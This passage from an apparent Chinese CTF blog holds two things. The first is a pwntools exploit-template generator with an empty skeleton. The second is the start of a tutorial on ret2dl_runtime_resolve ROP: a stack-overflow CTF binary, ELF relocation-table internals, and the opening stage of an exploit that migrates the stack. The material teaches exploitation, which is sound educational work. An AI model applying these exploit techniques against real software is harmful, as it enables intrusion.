io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">%<span class="keyword">if</span> ctx.binary <span class="keyword">and</span> <span class="keyword">not</span> quiet:</span><br><span class="line"><span class="comment"># $&#123;'%-10s%s-%s-%s' % ('Arch:',</span></span><br><span class="line">                       ctx.binary.arch,</span><br><span class="line">                       ctx.binary.bits,</span><br><span class="line">                       ctx.binary.endian)&#125;</span><br><span class="line">%<span class="keyword">for</span> line <span class="keyword">in</span> ctx.binary.checksec(color=<span class="literal">False</span>).splitlines():</span><br><span class="line"><span class="comment"># $&#123;line&#125;</span></span><br><span class="line">%endfor</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>具体语法可以理解为<br>%if args<br>content<br>%endif<br>content就是内容,args就是参数，通过这个方法进行模板的生成</p>
<h3 id="pwntools-exp模板生成方法"><a href="#pwntools-exp模板生成方法" class="headerlink" title="pwntools exp模板生成方法"></a>pwntools exp模板生成方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> absolute_import</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.commandline <span class="keyword">import</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mako.lookup <span class="keyword">import</span> TemplateLookup</span><br><span class="line"></span><br><span class="line">parser = common.parser_commands.add_parser(</span><br><span class="line">    <span class="string">'template'</span>,</span><br><span class="line">    help = <span class="string">'Generate an exploit template'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'exe'</span>, nargs=<span class="string">'?'</span>, help=<span class="string">'Target binary'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--host'</span>, help=<span class="string">'Remote host / SSH server'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--port'</span>, help=<span class="string">'Remote port / SSH port'</span>, type=int)</span><br><span class="line">parser.add_argument(<span class="string">'--libc'</span>, help=<span class="string">'Remote libc version'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--local'</span>, help=<span class="string">'local debug'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(args)</span>:</span></span><br><span class="line">    cache = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        cache = os.path.join(context.cache_dir, <span class="string">'mako'</span>)</span><br><span class="line"></span><br><span class="line">    lookup = TemplateLookup(</span><br><span class="line">        directories      = [os.path.join(pwnlib.data.path, <span class="string">'templates'</span>)],</span><br><span class="line">        module_directory = cache</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template = lookup.get_template(<span class="string">'pwnup.mako'</span>)</span><br><span class="line">    output = template.render(args.exe,</span><br><span class="line">                             args.host,</span><br><span class="line">                             args.port,</span><br><span class="line">                             args.libc,</span><br><span class="line">                             args.local,</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Fix Mako formatting bs</span></span><br><span class="line">    output = re.sub(<span class="string">'\n\n\n'</span>, <span class="string">'\n\n'</span>, output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.stdout.isatty():</span><br><span class="line">        <span class="keyword">try</span>: os.fchmod(sys.stdout.fileno(), <span class="number">0700</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwnlib.commandline.common.main(__file__)</span><br></pre></td></tr></table></figure>

<h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>└──╼ $pwn template oreo –libc libc.so.6</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'oreo'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'oreo'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>二进制,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>高级ROP ret2dl_runtime 之通杀详解</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="高级ROP-ret2dl-runtime-之通杀详解-本文首发于先知社区"><a href="#高级ROP-ret2dl-runtime-之通杀详解-本文首发于先知社区" class="headerlink" title="高级ROP ret2dl_runtime 之通杀详解(本文首发于先知社区)"></a>高级ROP ret2dl_runtime 之通杀详解(本文首发于先知社区)</h1><p>前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了</p><h2 id="ret2dllruntime-原理"><a href="#ret2dllruntime-原理" class="headerlink" title="ret2dllruntime 原理"></a>ret2dllruntime 原理</h2><a id="more"></a>
<p>先推荐几个地址学习下</p>
<ul>
<li><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop" alt="ctf-wiki之高级ROP"></p>
</li>
<li><p><img src="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure/" alt="ctf-wiki之elf文件基本结构"></p>
</li>
</ul>
<p>虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。<br>ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的栈溢出<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcugf5krj30ao0ej3ys.jpg" alt="1"><br>可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：<br>没有leak，如何做呢，ctf-wiki高级ROP了解一波</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。</p>
<p>我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p>
<pre><code>控制程序执行 dl_resolve 函数
    给定 Link_map 以及 index 两个参数。
    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。
控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。
伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。
伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</code></pre><p>此外，这个攻击成功的很必要的条件</p>
<pre><code>dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。
dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</code></pre><p>注意：</p>
<pre><code>符号版本信息
    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。
重定位表项
    r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</code></pre><p><strong>相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)</strong><br>这里先说下动态延迟绑定机制：<br>就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度<br>所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处<br>先看下调试部分吧</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">► <span class="number">0x8048390</span>  &lt;read@plt&gt;                  jmp    dword ptr [read@got.plt] &lt;<span class="number">0x804a00c</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048396</span>  &lt;read@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">  <span class="number">0x804839b</span>  &lt;read@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x8048380</span></span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x8048380</span>                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+<span class="number">4</span>] &lt;<span class="number">0x804a004</span>&gt;</span><br><span class="line">  <span class="number">0x8048386</span>                              jmp    dword ptr [<span class="number">0x804a008</span>] &lt;<span class="number">0xf7fe96c0</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0xf7fe96c0</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">  <span class="number">0xf7fe96c1</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">  <span class="number">0xf7fe96c2</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">  <span class="number">0xf7fe96c3</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0xf7fe96c7</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">  <span class="number">0xf7fe96cb</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe3ac0</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这是我在read@plt处下断，</p>
<ul>
<li>你看他第一次调用的时候，<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>里存的是下一条指令的地址，也就是0x8048396，</li>
<li>然后将read函数在表里的偏移push进去，这里push的是0，</li>
<li>然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>表里，然后将程序的控制权交给解析出来的地址指向的函数</li>
</ul>
<p><strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong><br>这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程<br>我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。</p>
<h2 id="elf部分的关键点（来自ctf-wiki"><a href="#elf部分的关键点（来自ctf-wiki" class="headerlink" title="elf部分的关键点（来自ctf-wiki)"></a>elf部分的关键点（来自ctf-wiki)</h2><p>动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。</p>
<ol>
<li>当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。</li>
<li>如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。</li>
<li>这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。</li>
<li>那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。</li>
<li>因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。</li>
<li>在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。</li>
<li>当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。</li>
<li>过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。</li>
</ol>
<p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用</p>
<p>_dl_runtime_resolve(link_map_obj, reloc_index)</p>
<p>这里以 32 位为例（64 位类似），具体的过程如下</p>
<ul>
<li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index</li>
<li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li>
<li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li>
<li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li>
<li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<ul>
<li>if (sym-&gt;st_other) &amp; 3 == 0 )</li>
<li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li>
</ul>
</li>
<li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li>
<li><ul>
<li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li>
</ul>
</li>
<li><ul>
<li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li>
</ul>
</li>
<li>根据 name 来寻找相应函数在库中的地址。<ul>
<li>name = STRTAB + sym-&gt;st_name</li>
</ul>
</li>
</ul>
<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了<br>简单来说，ret2dllruntime这个攻击方式他要利用三个表:</p>
<ol>
<li>.rel.plt </li>
<li>.dynsym</li>
<li>.dynstr</li>
</ol>
<ul>
<li>他先从.rel.plt表里找到某个函数在dynsym里的偏移</li>
<li>然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移</li>
<li>在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数<br>所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的<br>贴张图，这是整体结构部分图</li>
</ul>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wctwfkbtj311q0luwlp.jpg" alt="2"></p>
<h3 id="第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><a href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table" class="headerlink" title="第一个表是.rel.plt也就是ELF REL Relocation Table"></a>第一个表是.rel.plt也就是ELF REL Relocation Table</h3><p>这个表里有个结构体，存储了写入位置和具体偏移量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LOAD:0804831C ; ELF REL Relocation Table</span><br><span class="line">LOAD:0804831C                 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048324                 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderr</span><br><span class="line">LOAD:0804832C                 Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048334                 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:0804833C ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0804833C                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT <span class="built_in">read</span></span><br><span class="line">LOAD:08048344                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarm</span><br><span class="line">LOAD:0804834C                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048354                 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbuf</span><br><span class="line">LOAD:08048354 LOAD            ends</span><br></pre></td></tr></table></figure>
<ul>
<li>前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">           Elf32_Addr r_offset;</span><br><span class="line">           Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>
<ul>
<li>他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找</li>
</ul>
<h3 id="第二个表是-dynsym也就是ELF-Symbol-Table"><a href="#第二个表是-dynsym也就是ELF-Symbol-Table" class="headerlink" title="第二个表是.dynsym也就是ELF Symbol Table"></a>第二个表是.dynsym也就是ELF Symbol Table</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:080481DC ; ELF Symbol Table</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804821C                            0&gt;</span><br><span class="line">LOAD:0804822C                 Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;</span><br><span class="line">LOAD:0804823C                 Elf32_Sym &lt;offset aStdout - offset byte_804827C, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:0804823C                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804824C                 Elf32_Sym &lt;offset aStderr - offset byte_804827C, \ ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804824C                            offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804825C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804825C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804826C                 Elf32_Sym &lt;offset aStdin - offset byte_804827C, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:0804826C                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure>
<p>在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure>
<p>我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的</p>
<h3 id="第三个表就是-dynstr了，也就是ELF-String-Table"><a href="#第三个表就是-dynstr了，也就是ELF-String-Table" class="headerlink" title="第三个表就是.dynstr了，也就是ELF String Table"></a>第三个表就是.dynstr了，也就是ELF String Table</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:0804827C ; ELF String Table</span><br><span class="line">LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804827C                                         ; LOAD:080481FC↑o ...</span><br><span class="line">LOAD:0804827D aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048287 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048296 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:0804829C aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:080482A1 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482A8 aStderr         db &apos;stderr&apos;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:080482AF aAlarm          db &apos;alarm&apos;,0            ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:080482B5 aSetvbuf        db &apos;setvbuf&apos;,0          ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:080482BD aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482BD                                         ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CF aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:080482DE aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0</span><br></pre></td></tr></table></figure>
<p>这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数<br><strong>注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的</strong></p>
<h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(rop.chain())</span><br></pre></td></tr></table></figure>
<p>这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下</p>
